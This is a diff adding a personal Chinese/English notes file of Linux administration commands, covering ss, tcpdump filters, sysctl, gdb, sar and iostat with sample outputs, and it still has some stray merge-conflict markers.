@@ -1,0 +1,2241 @@
+* pidof
+pidof 任务名
+获取指定任务的pid
+* ss
+ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。
+-h, --help 帮助信息
+-V, --version 程序版本信息
+-n, --numeric 不解析服务名称
+-r, --resolve        解析主机名
+-a, --all 显示所有套接字（sockets）
+-l, --listening 显示监听状态的套接字（sockets）
+-o, --options        显示计时器信息
+-e, --extended       显示详细的套接字（sockets）信息
+-m, --memory         显示套接字（socket）的内存使用情况
+-p, --processes 显示使用套接字（socket）的进程
+-i, --info 显示 TCP内部信息
+-s, --summary 显示套接字（socket）使用概况
+-4, --ipv4           仅显示IPv4的套接字（sockets）
+-6, --ipv6           仅显示IPv6的套接字（sockets）
+-0, --packet         显示 PACKET 套接字（socket）
+-t, --tcp 仅显示 TCP套接字（sockets）
+-u, --udp 仅显示 UCP套接字（sockets）
+-d, --dccp 仅显示 DCCP套接字（sockets）
+-w, --raw 仅显示 RAW套接字（sockets）
+-x, --unix 仅显示 Unix套接字（sockets）
+-f, --family=FAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink
+-A, --query=QUERY, --socket=QUERY
+      QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY]
+-D, --diag=FILE     将原始TCP套接字（sockets）信息转储到文件
+ -F, --filter=FILE   从文件中都去过滤器信息
+       FILTER := [ state TCP-STATE ] [ EXPRESSION ]
+
+
+>>>>>>> .r272
+
+* lwp-request
+echo "a=&b=&=" | lwp-request -m POST http://xxxxx
+* tcpdump用法
+  tcpdump相比较wireshark是很轻量的东东，而且机器一般默认安装又不需要图形界面。
+  需要注意tcpdump默认获取一个包的前96字节，如果你想看更多，需要使用-s 选项。建议使用-s 0， 会获取所有的数据。
+  常用的选项：
+-i any : Listen on all interfaces just to see if you're seeing any traffic.
+-n : Don't resolve hostnames.
+-nn : Don't resolve hostnames or port names.
+-X : Show the packet's contents in both hex and ASCII.
+-XX : Same as -X, but also shows the ethernet header.
+-v, -vv, -vvv : Increase the amount of packet information you get back.
+-c : Only get x number of packets and then stop.
+-s : Define the size of the capture (use -s0 unless you are intentionally capturing less.)
+-S : Print absolute sequence numbers.
+-e : Get the ethernet header as well.
+-q : Show less protocol information.
+-E : Decrypt IPSEC traffic by providing an encryption key.
+-s : Set the snaplength, i.e. the amount of data that is being captured in bytes
+-c : Only capture x number of packets, e.g. 'tcpdump -c 3'
+基本用法：
+1. Basic communication
+#+begin_src c
+   #tcpdump -nS
+#+end_src
+
+2. Basic communication (very verbose)
+   不再名字解释，
+#+begin_example
+   #tcpdump -nnvvS
+#+end_example
+3. A deeper look at the traffic
+#+begin_example
+   #tcpdump -nnvvXS
+#+end_example
+4. Heavy packet viewing
+//最后's'增加抓取长度，抓取整个包
+#+begin_example
+#tcpdump -nnvvXSs 1514
+#+end_example
+
+下面我们使用上面的选项，仅抓取两个(-c2)ICMP包。
+#+begin_example
+hermes root # tcpdump -nnvXSs 0 -c2 icmp
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), 23:11:10.370321 IP 
+(tos 0x20, ttl  48, id 34859, offset 0, flags [none], length: 84) 
+69.254.213.43 > 72.21.34.42: icmp 64: echo request seq 0
+
+        0x0000:  4520 0054 882b 0000 3001 7cf5 45fe d52b  E..T.+..0.|.E..+
+        0x0010:  4815 222a 0800 3530 272a 0000 25ff d744  H."*..50'*..%..D
+        0x0020:  ae5e 0500 0809 0a0b 0c0d 0e0f 1011 1213  .^..............
+        0x0030:  1415 1617 1819 1a1b 1c1d 1e1f 2021 2223  .............!"#
+        0x0040:  2425 2627 2829 2a2b 2c2d 2e2f 3031 3233  $%&'()*+,-./0123
+        0x0050:  3435 3637                                4567
+23:11:10.370344 IP (tos 0x20, ttl  64, id 35612, offset 0, flags [none], 
+length: 84) 72.21.34.42 > 69.254.213.43: icmp 64: echo reply seq 0
+        0x0000:  4520 0054 8b1c 0000 4001 6a04 4815 222a  E..T....@.j.H."*
+        0x0010:  45fe d52b 0000 3d30 272a 0000 25ff d744  E..+..=0'*..%..D
+        0x0020:  ae5e 0500 0809 0a0b 0c0d 0e0f 1011 1213  .^..............
+        0x0030:  1415 1617 1819 1a1b 1c1d 1e1f 2021 2223  .............!"#
+        0x0040:  2425 2627 2829 2a2b 2c2d 2e2f 3031 3233  $%&'()*+,-./0123
+        0x0050:  3435 3637                                4567
+2 packets captured
+2 packets received by filter
+0 packets dropped by kernel
+hermes root # 
+#+end_example
+
+Common Syntax
+表达式允许你trim out不同的数据通讯，准确找到你需要的数据。
+掌握表达式并且学会创造性组合。
+有三种类型的表达式：type、dir、proto
+type的选项：host，net, port
+dir的选项： src, dst, src or dst, src and dst
+
+host //查看这个IP相关的通讯
+#+begin_example
+#tcpdump host 1.2.3.4
+#+end_example
+
+src, dst //查看指定来源或者目的通讯（排除了另一个方向的通讯）
+#+begin_example
+#tcpdump src 2.3.4.5
+#tcpdump dst 3.4.5.6
+#+end_example
+
+net //获取这个网络，使用CIDR表示法
+#+begin_example
+#tcpdump net 1.2.3.0/24
+#+end_example
+
+proto // 用于tcp, udp, icmp
+#+begin_example
+# tcpdump icmp
+#+end_example
+
+src port, dst port //使用源端口或者目的端口过滤
+#+begin_example
+# tcpdump src port 1025 
+# tcpdump dst port 389
+#+end_example
+
+src/dst, port, protocol //组合三种
+#+begin_example
+#tcpdump src port 1025 and tcp 
+#tcpdump udp and src port 53
+#+end_example
+
+你也可以过滤端口范围
+Port Ranges //see traffic to any port in a range
+#+begin_example
+tcpdump portrange 21-23
+#+end_example
+
+Packet Size Filter //只能看小于某个值，或者大于某个值的包（单位bytes)
+#+begin_example
+tcpdump less 32
+tcpdump greater 128
+tcpdump > 32
+tcpdump <= 128
+#+end_example
+
+写到文件中：
+tcpdump使用-w选项：允许你把抓取的数据写到一个文件中，
+然后使用-r选项，读取文件。
+
+捕获所有80端的通讯数据到一个文件
+#+begin_example
+#tcpdump -s 1514 port 80 -w capture_file
+#+end_example
+
+读取通讯数据到tcpdump中
+#+begin_example
+#tcpdump -r capture_file
+#+end_example
+
+逻辑表达式
+1. 与: and &&
+2. 或: or ||
+3. 非: not !
+
+例子
+#+begin_example
+//源 10.5.2.3 目的端口 3389
+tcpdump -nnvvS and src 10.5.2.3 and dst port 3389
+// 从192.168 网络发往 10或者172.16网络
+tcpdump -nvX src net 192.168.0.0/16 and dst net 10.0.0.0/8 or 172.16.0.0/16
+// 从 172.16网络发往 192.168.0.2的非ICMP
+tcpdump -nvvXSs 1514 dst 192.168.0.2 and src net 172.16.0.0/16 and not icmp
+
+tcpdump -vv src mars and not dst port 22
+#+end_example
+
+Grouping
+下面是不对的。
+# Traffic that's from 10.0.2.4 AND destined for ports 3389 or 22 (incorrect)
+tcpdump src 10.0.2.4 and (dst port 3389 or 22)
+需要使用\转义小括号，或者使用单引号，如下
+tcpdump 'src 10.0.2.4 and (dst port 3389 or 22)'
+
+** example
+*** Filter on protocol (ICMP) and protocol-specific fields (ICMP type) 
+
+ Capture all ICMP with some exceptions. For example, if a host runs lots of pings (SmokePing for example), it is useful to suppress ICMP echo requests and replies from dumped packets: 
+
+: root@myhost:~# tcpdump -n icmp and 'icmp[0] != 8 and icmp[0] != 0'
+
+ Same command can be used with predefined header field offset (icmptype) and ICMP type field values (icmp-echo and icmp-echoreply): 
+
+: root@myhost:~# tcpdump -n icmp and icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply
+
+*** Filter on TOS field 
+
+ Capture all IP packets with a non-zero TOS field (one byte TOS field is at offset 1 in IP header): 
+
+: root@myhost:~# tcpdump -v -n ip and ip[1]!=0
+
+*** Filter on TTL field 
+
+ Capture all IP packets with TTL less than some value (on byte TTL field is at offset 8 in IP header): 
+
+: root@myhost:~# tcpdump -v ip and 'ip[8]<2'
+
+*** Filter on TCP flags (SYN/ACK) 
+
+ Catch TCP SYN packets: 
+
+: root@myhost:~# tcpdump -n tcp and port 80 and 'tcp[tcpflags] & tcp-syn == tcp-syn'
+
+ In the example above, all packets with TCP SYN flag set are captured.
+ Other flags (ACK, for example) might be set also. Packets which have only TCP SYN flags set, can be captured like this: 
+: root@myhost:~# tcpdump tcp and port 80 and 'tcp[tcpflags] == tcp-syn'
+
+ Catch TCP SYN/ACK packets (typically, responses from servers): 
+: root@myhost:~# tcpdump -n tcp and 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'
+
+ Same thing: 
+: root@myhost:~# tcpdump -n tcp and 'tcp[tcpflags] & tcp-syn == tcp-syn' and 'tcp[tcpflags] & tcp-ack == tcp-ack'
+
+*** Catch ARP packets 
+
+: root@myhost:~# tcpdump -vv -e -nn ether proto 0x0806
+
+*** Filter on IP packet length 
+
+ Catch packets of a specified length (IP packet length (16 bits) is located at offset 2 in IP header): 
+
+: root@myhost:~# tcpdump -l icmp and '(ip[2:2]>50)' -w - |tcpdump -r - -v ip and '(ip[2:2]<60)'
+tcpdump: pcap_loop: error reading dump file: Interrupted system call
+
+ Remark: due to some bug in tcpdump, the following command doesn't catch packets as expected: 
+: root@myhost:~# tcpdump -v -n icmp and '(ip[2:2]>50)' and '(ip[2:2]<60)'
+
+ Because of this, two tcpdumps were used in the example above (tcpdump -l ... -w - |tcpdump -r -...).
+ Option -l is needed to force first tcpdump program to output captured data imeadiately to the second program. 
+
+*** Filter on encapsulated content (ICMP within PPPoE) 
+
+ Capturing packets from PPPoE session. For example: we mirror a link that connects xDSL modem and home PC or router. 
+ Mirrored packets are ethernet frames with PPPoE/IP packets encapsulated. 
+ In the following example, we are looking for ICMP packets in PPPoE frames. A simple command like 
+: root@myhost:~# tcpdump -v -n icmp
+ will not produce expected results, because packets that we monitor are being encapsulated into a PPPoE frames. 
+ Of course, tcpdump can't locate IP protocol == ICMP at normal offset in an ethernet frame. 
+ We must therefore take into account the additional headers: 14 bytes for ethernet and 8 bytes for PPPoE. 
+ IP protocol is located at offset 9 in the IP header, which gives us offset 31 in the mirrored ethernet frame.
+ Therefore, ICMP packets (protokol 1) are captured with 
+: root@myhost:~# tcpdump -v -n ether[31] = 1
+
+Simultaneous output to dump file and (decoded) standard output 
+
+ You may want to dump packets to a file, but still see the decoded headers "live" on your terminal.
+ While this is not supported directly by tcpdump you can use the powerful pipe mechanism to obtain this effect: 
+
+: leinen@bonadea[leinen]; sudo tcpdump -s 0 -i tun0 -c 10 -w - -U | tee foo.pcap | tcpdump -n -r -
+
+: leinen@bonadea[leinen]; ls -l foo.pcap
+-rw-r--r-- 1 leinen leinen 1184 2008-11-28 11:04 foo.pcap
+
+ Explanation: The first tcpdump call captures the packets, and dumps the (binary) data to standard output (-w -).
+ The -U (unbuffered) flag causes each packet to be written out immediately, circumventing the normal output buffering.
+ This preserves the real-time characteristics better. The binary packets are piped to the tee command,
+ which writes them to a file (foo.pcap) and at the same time outputs them again on standard output. From there, they are decoded using tcpdump -r -.
+
+
+*** other
+ To print all packets arriving at or departing from sundown:
+
+    tcpdump host sundown
+
+To print traffic between helios and either hot or ace:
+
+    tcpdump host helios and \( hot or ace \)
+
+To print all IP packets between ace and any host except helios:
+
+    tcpdump ip host ace and not helios
+
+To print all traffic between local hosts and hosts at Berkeley:
+
+    tcpdump net ucb-ether
+
+To print all ftp traffic through internet gateway snup: (note that the expression is quoted to prevent the shell from (mis-)interpreting the parentheses):
+
+    tcpdump 'gateway snup and (port ftp or ftp-data)'
+
+To print traffic neither sourced from nor destined for local hosts (if you gateway to one other net, this stuff should never make it onto your local net).
+
+    tcpdump ip and not net localnet
+
+To print the start and end packets (the SYN and FIN packets) of each TCP conversation that involves a non-local host.
+
+    tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'
+
+To print all IPv4 HTTP packets to and from port 80, i.e. print only packets that contain data, not, for example, SYN and FIN packets and ACK-only packets. (IPv6 is left as an exercise for the reader.)
+#+begin_example
+    tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
+#+end_example
+To print IP packets longer than 576 bytes sent through gateway snup:
+#+begin_example
+    tcpdump 'gateway snup and ip[2:2] > 576'
+#+end_example
+To print IP broadcast or multicast packets that were not sent via Ethernet broadcast or multicast:
+#+begin_example
+    tcpdump 'ether[0] & 1 = 0 and ip[16] >= 224'
+#+end_example
+To print all ICMP packets that are not echo requests/replies (i.e., not ping packets):
+
+    tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'
+
+
+
+* 使用telnet测试端口是否联通
+=======
+
+* sysctl
+** 查看所有可读变量：
+  % sysctl -a
+** 临时修改一个配置
+  % sysctl -w varible=value
+** 永久需要修改：
+  1 修改/etc/sysctl.conf
+  2 执行sysctl -p
+
+* 查看目录占用的硬盘大小
+  du -s du -k
+  查看占用空间最大
+  du -S | sort -n
+
+* gdb
+** 调试带参数的程序
+  gdb --args ./testprg arg1 arg2 ....
+  或者
+  r arg1 arg2
+  OR
+  set arg arg1 arg2
+  run
+** 线程
+   thread n(n为线程号)
+
+   where 查看调用栈
+* sar
+Using sar you can monitor performance of various Linux subsystems (CPU, Memory, I/O..) in real time.
+
+Using sar, you can also collect all performance data on an on-going basis, store them, and do historical analysis to identify bottlenecks.
+
+Sar is part of the sysstat package.
+
+    Collective CPU usage
+    Individual CPU statistics
+    Memory used and available
+    Swap space used and available
+    Overall I/O activities of the system
+    Individual device I/O activities
+    Context switch statistics
+    Run queue and load average data
+    Network statistics
+    Report sar data from a specific time
+
+
+ install sysstat
+(or)
+yum install sysstat
+(or)
+rpm -ivh sysstat-10.0.0-1.i586.rpm
+
+Install Sysstat from Source
+
+Following are the other sysstat utilities.
+
+    sar collects and displays ALL system activities statistics.
+    sadc stands for “system activity data collector”. This is the sar backend tool that does the data collection.
+    sa1 stores system activities in binary data file. sa1 depends on sadc for this purpose. sa1 runs from cron.
+    sa2 creates daily summary of the collected statistics. sa2 runs from cron.
+    sadf can generate sar report in CSV, XML, and various other formats. Use this to integrate sar data with other tools.
+    iostat generates CPU, I/O statistics
+    mpstat displays CPU statistics.
+    pidstat reports statistics based on the process id (PID)
+    nfsiostat displays NFS I/O statistics.
+    cifsiostat generates CIFS statistics.
+
+
+Collect the sar statistics using cron job – sa1 and sa2
+
+Create sysstat file under /etc/cron.d directory that will collect the historical sar data.
+
+# vi /etc/cron.d/sysstat
+*/10 * * * * root /usr/local/lib/sa/sa1 1 1
+53 23 * * * root /usr/local/lib/sa/sa2 -A
+
+If you’ve installed sysstat from source, the default location of sa1 and sa2 is /usr/local/lib/sa. If you’ve installed using your distribution update method (for example: yum, up2date, or apt-get), this might be /usr/lib/sa/sa1 and /usr/lib/sa/sa2.
+
+Note: To understand cron entries, read Linux Crontab: 15 Awesome Cron Job Examples.
+/usr/local/lib/sa/sa1
+
+    This runs every 10 minutes and collects sar data for historical reference.
+    If you want to collect sar statistics every 5 minutes, change */10 to */5 in the above /etc/cron.d/sysstat file.
+    This writes the data to /var/log/sa/saXX file. XX is the day of the month. saXX file is a binary file. You cannot view its content by opening it in a text editor.
+    For example, If today is 26th day of the month, sa1 writes the sar data to /var/log/sa/sa26
+    You can pass two parameters to sa1: interval (in seconds) and count.
+    In the above crontab example: sa1 1 1 means that sa1 collects sar data 1 time with 1 second interval (for every 10 mins).
+
+/usr/local/lib/sa/sa2
+
+    This runs close to midnight (at 23:53) to create the daily summary report of the sar data.
+    sa2 creates /var/log/sa/sarXX file (Note that this is different than saXX file that is created by sa1). This sarXX file created by sa2 is an ascii file that you can view it in a text editor.
+    This will also remove saXX files that are older than a week. So, write a quick shell script that runs every week to copy the /var/log/sa/* files to some other directory to do historical sar data analysis.
+
+II. 10 Practical Sar Usage Examples
+
+There are two ways to invoke sar.
+
+    sar followed by an option (without specifying a saXX data file). This will look for the current day’s saXX data file and report the performance data that was recorded until that point for the current day.
+    sar followed by an option, and additionally specifying a saXX data file using -f option. This will report the performance data for that particular day. i.e XX is the day of the month.
+
+In all the examples below, we are going to explain how to view certain performance data for the current day. To look for a specific day, add “-f /var/log/sa/saXX” at the end of the sar command.
+
+All the sar command will have the following as the 1st line in its output.
+
+$ sar -u
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+    Linux 2.6.18-194.el5PAE – Linux kernel version of the system.
+    (dev-db) – The hostname where the sar data was collected.
+    03/26/2011 – The date when the sar data was collected.
+    _i686_ – The system architecture
+    (8 CPU) – Number of CPUs available on this system. On multi core systems, this indicates the total number of cores.
+
+
+1. CPU Usage of ALL CPUs (sar -u)
+
+This gives the cumulative real-time CPU usage of all CPUs. “1 3″ reports for every 1 seconds a total of 3 times. Most likely you’ll focus on the last field “%idle” to see the cpu load.
+
+$ sar -u 1 3
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:27:32 PM       CPU     %user     %nice   %system   %iowait    %steal     %idle
+01:27:33 PM       all      0.00      0.00      0.00      0.00      0.00    100.00
+01:27:34 PM       all      0.25      0.00      0.25      0.00      0.00     99.50
+01:27:35 PM       all      0.75      0.00      0.25      0.00      0.00     99.00
+Average:          all      0.33      0.00      0.17      0.00      0.00     99.50
+
+Following are few variations:
+    sar -u Displays CPU usage for the current day that was collected until that point.
+    sar -u 1 3 Displays real time CPU usage every 1 second for 3 times.
+    sar -u ALL Same as “sar -u” but displays additional fields.
+    sar -u ALL 1 3 Same as “sar -u 1 3″ but displays additional fields.
+    sar -u -f /var/log/sa/sa10 Displays CPU usage for the 10day of the month from the sa10 file.
+
+2. CPU Usage of Individual CPU or Core (sar -P)
+
+If you have 4 Cores on the machine and would like to see what the individual cores are doing, do the following.
+
+“-P ALL” indicates that it should displays statistics for ALL the individual Cores.
+
+In the following example under “CPU” column 0, 1, 2, and 3 indicates the corresponding CPU core numbers.
+
+$ sar -P ALL 1 1
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:34:12 PM       CPU     %user     %nice   %system   %iowait    %steal     %idle
+01:34:13 PM       all     11.69      0.00      4.71      0.69      0.00     82.90
+01:34:13 PM         0     35.00      0.00      6.00      0.00      0.00     59.00
+01:34:13 PM         1     22.00      0.00      5.00      0.00      0.00     73.00
+01:34:13 PM         2      3.00      0.00      1.00      0.00      0.00     96.00
+01:34:13 PM         3      0.00      0.00      0.00      0.00      0.00    100.00
+
+“-P 1″ indicates that it should displays statistics only for the 2nd Core. (Note that Core number starts from 0).
+
+$ sar -P 1 1 1
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:36:25 PM       CPU     %user     %nice   %system   %iowait    %steal     %idle
+01:36:26 PM         1      8.08      0.00      2.02      1.01      0.00     88.89
+
+Following are few variations:
+
+    sar -P ALL Displays CPU usage broken down by all cores for the current day.
+    sar -P ALL 1 3 Displays real time CPU usage for ALL cores every 1 second for 3 times (broken down by all cores).
+    sar -P 1 Displays CPU usage for core number 1 for the current day.
+    sar -P 1 1 3 Displays real time CPU usage for core number 1, every 1 second for 3 times.
+    sar -P ALL -f /var/log/sa/sa10 Displays CPU usage broken down by all cores for the 10day day of the month from sa10 file.
+
+3. Memory Free and Used (sar -r)
+
+This reports the memory statistics. “1 3″ reports for every 1 seconds a total of 3 times. Most likely you’ll focus on “kbmemfree” and “kbmemused” for free and used memory.
+
+$ sar -r 1 3
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+07:28:06 AM kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact
+07:28:07 AM   6209248   2097432     25.25    189024   1796544    141372      0.85   1921060     88204
+07:28:08 AM   6209248   2097432     25.25    189024   1796544    141372      0.85   1921060     88204
+07:28:09 AM   6209248   2097432     25.25    189024   1796544    141372      0.85   1921060     88204
+Average:      6209248   2097432     25.25    189024   1796544    141372      0.85   1921060     88204
+
+Following are few variations:
+
+    sar -r
+    sar -r 1 3
+    sar -r -f /var/log/sa/sa10
+
+4. Swap Space Used (sar -S)
+
+This reports the swap statistics. “1 3″ reports for every 1 seconds a total of 3 times. If the “kbswpused” and “%swpused” are at 0, then your system is not swapping.
+
+$ sar -S 1 3
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+07:31:06 AM kbswpfree kbswpused  %swpused  kbswpcad   %swpcad
+07:31:07 AM   8385920         0      0.00         0      0.00
+07:31:08 AM   8385920         0      0.00         0      0.00
+07:31:09 AM   8385920         0      0.00         0      0.00
+
+Average:      8385920         0      0.00         0      0.00
+
+Following are few variations:
+
+    sar -S
+    sar -S 1 3
+    sar -S -f /var/log/sa/sa10
+
+Notes:
+
+    Use “sar -R” to identify number of memory pages freed, used, and cached per second by the system.
+    Use “sar -H” to identify the hugepages (in KB) that are used and available.
+    Use “sar -B” to generate paging statistics. i.e Number of KB paged in (and out) from disk per second.
+    Use “sar -W” to generate page swap statistics. i.e Page swap in (and out) per second.
+
+5. Overall I/O Activities (sar -b)
+
+This reports I/O statistics. “1 3″ reports for every 1 seconds a total of 3 times.
+
+Following fields are displays in the example below.
+
+    tps – Transactions per second (this includes both read and write)
+    rtps – Read transactions per second
+    wtps – Write transactions per second
+    bread/s – Bytes read per second
+    bwrtn/s – Bytes written per second
+
+$ sar -b 1 3
+
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:56:28 PM       tps      rtps      wtps   bread/s   bwrtn/s
+01:56:29 PM    346.00    264.00     82.00   2208.00    768.00
+01:56:30 PM    100.00     36.00     64.00    304.00    816.00
+01:56:31 PM    282.83     32.32    250.51    258.59   2537.37
+Average:       242.81    111.04    131.77    925.75   1369.90
+
+Following are few variations:
+
+    sar -b
+    sar -b 1 3
+    sar -b -f /var/log/sa/sa10
+
+Note: Use “sar -v” to display number of inode handlers, file handlers, and pseudo-terminals used by the system.
+6. Individual Block Device I/O Activities (sar -d)
+
+To identify the activities by the individual block devices (i.e a specific mount point, or LUN, or partition), use “sar -d”
+
+$ sar -d 1 1
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:59:45 PM       DEV       tps  rd_sec/s  wr_sec/s  avgrq-sz  avgqu-sz     await     svctm     %util
+01:59:46 PM    dev8-0      1.01      0.00      0.00      0.00      0.00      4.00      1.00      0.10
+01:59:46 PM    dev8-1      1.01      0.00      0.00      0.00      0.00      4.00      1.00      0.10
+01:59:46 PM dev120-64      3.03     64.65      0.00     21.33      0.03      9.33      5.33      1.62
+01:59:46 PM dev120-65      3.03     64.65      0.00     21.33      0.03      9.33      5.33      1.62
+01:59:46 PM  dev120-0      8.08      0.00    105.05     13.00      0.00      0.38      0.38      0.30
+01:59:46 PM  dev120-1      8.08      0.00    105.05     13.00      0.00      0.38      0.38      0.30
+01:59:46 PM dev120-96      1.01      8.08      0.00      8.00      0.01      9.00      9.00      0.91
+01:59:46 PM dev120-97      1.01      8.08      0.00      8.00      0.01      9.00     
+
+In the above example “DEV” indicates the specific block device.
+
+For example: “dev53-1″ means a block device with 53 as major number, and 1 as minor number.
+
+The device name (DEV column) can display the actual device name (for example: sda, sda1, sdb1 etc.,), if you use the -p option (pretty print) as shown below.
+
+$ sar -p -d 1 1
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:59:45 PM       DEV       tps  rd_sec/s  wr_sec/s  avgrq-sz  avgqu-sz     await     svctm     %util
+01:59:46 PM       sda      1.01      0.00      0.00      0.00      0.00      4.00      1.00      0.10
+01:59:46 PM      sda1      1.01      0.00      0.00      0.00      0.00      4.00      1.00      0.10
+01:59:46 PM      sdb1      3.03     64.65      0.00     21.33      0.03      9.33      5.33      1.62
+01:59:46 PM      sdc1      3.03     64.65      0.00     21.33      0.03      9.33      5.33      1.62
+01:59:46 PM      sde1      8.08      0.00    105.05     13.00      0.00      0.38      0.38      0.30
+
+01:59:46 PM      sdf1      8.08      0.
+
+00    105.05     13.00      0.00      0.38      0.38      0.30
+01:59:46 PM      sda2      1.01      8.08      0.00      8.00      0.01      9.00      9.00      0.91
+01:59:46 PM      sdb2      1.01      8.08      0.00      8.00      0.01      9.00      9.00      0.91
+
+Following are few variations:
+
+    sar -d
+    sar -d 1 3
+    sar -d -f /var/log/sa/sa10
+    sar -p -d
+
+7. Display context switch per second (sar -w)
+
+This reports the total number of processes created per second, and total number of context switches
+
+$ sar -w 1 3
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+08:32:24 AM    proc/s   cswch/s
+08:32:25 AM      3.00     53.00
+08:32:26 AM      4.00     61.39
+08:32:27 AM      2.00     57.00
+
+Following are few variations:
+
+    sar -w
+    sar -w 1 3
+    sar -w -f /var/log/sa/sa10
+
+8. Reports run queue and load average (sar -q)
+
+This reports the run queue size and load average of last 1 minute, 5 minutes, and 15 minutes. “1 3″ reports for every 1 seconds a total of 3 times.
+
+$ sar -q 1 3
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+06:28:53 AM   runq-sz  plist-sz   ldavg-1   ldavg-5  ldavg-15   blocked
+06:28:54 AM         0       230      2.00      3.00      5.00         0
+06:28:55 AM         2       210      2.01      3.15      5.15         0
+06:28:56 AM         2       230      2.12      3.12      5.12         0
+Average:            3       230      3.12      3.12      5.12         0
+
+Note: The “blocked” column displays the number of tasks that are currently blocked and
+
+waiting for I/O operation to complete.
+
+Following are few variations:
+
+    sar -q
+    sar -q 1 3
+    sar -q -f /var/log/sa/sa10
+
+9. Report network statistics (sar -n)
+
+This reports various network statistics. For example: number of packets received (transmitted) through the network card, statistics of packet failure etc.,. “1 3″ reports for every 1 seconds a total of 3 times.
+
+sar -n KEYWORD
+
+KEYWORD can be one of the following:
+
+    DEV – Displays network devices vital statistics for eth0, eth1, etc.,
+    EDEV – Display network device failure statistics
+    NFS – Displays NFS client activities
+    NFSD – Displays NFS server activities
+    SOCK – Displays sockets in use for IPv4
+    IP – Displays IPv4 network traffic
+    EIP – Displays IPv4 network errors
+    ICMP – Displays ICMPv4 network traffic
+    EICMP – Displays ICMPv4 network errors
+    TCP – Displays TCPv4 network traffic
+    ETCP – Displays TCPv4 network errors
+    UDP – Displays UDPv4 network traffic
+    SOCK6, IP6, EIP6, ICMP6, UDP6 are for IPv6
+
+    ALL – This displays all of the above information. The output will be very long.
+
+$ sar -n DEV 1 1
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+01:11:13 PM     IFACE   rxpck/s   txpck/s   rxbyt/s   txbyt/s   rxcmp/s   txcmp/s  rxmcst/s
+01:11:14 PM        lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00
+01:11:14 PM      eth0    342.57    342.57  93923.76 141773.27      0.00      0.00      0.00
+01:11:14 PM      eth1      0.00      0.00      0.00      0.00      0.00      0.00      0.00
+
+10. Report Sar Data Using Start Time (sar -s)
+
+When you view historic sar data from the /var/log/sa/saXX file using “sar -f” option, it displays all the sar data for that specific day starting from 12:00 a.m for that day.
+
+Using “-s hh:mi:ss” option, you can specify the start time. For example, if you specify “sar -s 10:00:00″, it will display the sar data starting from 10 a.m (instead of starting from midnight) as shown below.
+
+You can combine -s option with other sar option.
+
+For example, to report the load average on 26th of this month starting from 10 a.m in the morning, combine the -q and -s option as shown below.
+
+$ sar -q -f /var/log/sa/sa23 -s 10:00:01
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+10:00:01 AM   runq-sz  plist-sz   ldavg-1   ldavg-5  ldavg-15   blocked
+10:10:01 AM         0       127      2.00      3.00      5.00         0
+10:20:01 AM         0       127      2.00      3.00      5.00         0
+...
+11:20:01 AM         0       127      5.00      3.00      3.00         0
+12:00:01 PM         0       127      4.00      2.00      1.00         0
+
+There is no option to limit the end-time. You just have to get creative and use head command as shown below.
+
+For example, starting from 10 a.m, if you want to see 7 entries, you have to pipe the above output to “head -n 10″.
+
+$ sar -q -f /var/log/sa/sa23 -s 10:00:01 | head -n 10
+Linux 2.6.18-194.el5PAE (dev-db)        03/26/2011      _i686_  (8 CPU)
+
+10:00:01 AM   runq-sz  plist-sz   ldavg-1   ldavg-5  ldavg-15   blocked
+10:10:01 AM         0       127      2.00      3.00      5.00         0
+10:20:01 AM         0       127      2.00      3.00      5.00         0
+10:30:01 AM         0       127      3.00      5.00      2.00         0
+10:40:01 AM         0       127      4.00      2.00      1.00         2
+10:50:01 AM         0       127      3.00      5.00      5.00         0
+11:00:01 AM         0       127      2.00      1.00      6.00         0
+11:10:01 AM         0       127      1.00      3.00      7.00         2
+
+There is lot more to cover in Linux performance monitoring and tuning. We are only getting started. More articles to come in the performance series.
+
+* Iostat
+
+iostat reports CPU, disk I/O, and NFS statistics. The following are some of iostat command examples.
+
+Iostat without any argument displays information about the CPU usage, 
+and I/O statistics about all the partitions on the system as shown below.
+
+$ iostat
+Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011
+
+avg-cpu:  %user   %nice %system %iowait  %steal   %idle
+           5.68    0.00    0.52    2.03    0.00   91.76
+
+Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn
+sda             194.72      1096.66      1598.70 2719068704 3963827344
+sda1            178.20       773.45      1329.09 1917686794 3295354888
+sda2             16.51       323.19       269.61  801326686  668472456
+sdb             371.31       945.97      1073.33 2345452365 2661206408
+sdb1            371.31       945.95      1073.33 2345396901 2661206408
+
